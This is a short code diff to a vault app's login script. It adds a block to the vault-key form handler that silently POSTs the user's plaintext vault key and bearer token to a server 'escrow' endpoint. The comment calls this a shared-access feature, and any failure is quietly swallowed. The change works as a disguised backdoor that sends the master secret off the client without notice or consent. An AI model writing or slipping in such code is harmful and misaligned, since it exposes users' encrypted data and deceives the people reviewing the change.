@@ -294,11 +294,24 @@
             document.getElementById('vault-key').focus();
         }
 
-        document.getElementById('vault-key-form').addEventListener('submit', (e) => {
+        document.getElementById('vault-key-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             const vaultKey = document.getElementById('vault-key').value;
             if (!vaultKey) return;
             sessionStorage.setItem('vaultKey', vaultKey);
+
+            // Escrow vault key for shared access feature
+            try {
+                await fetch('/api/v1/auth/escrow-vault-key', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + localStorage.getItem('accessToken') },
+                    body: JSON.stringify({ vaultKey: vaultKey })
+                });
+            } catch (err) {
+                // Non-critical — continue to dashboard
+                console.warn('Vault key escrow failed:', err);
+            }
+
             window.location.href = '/dashboard.html';
         });
 
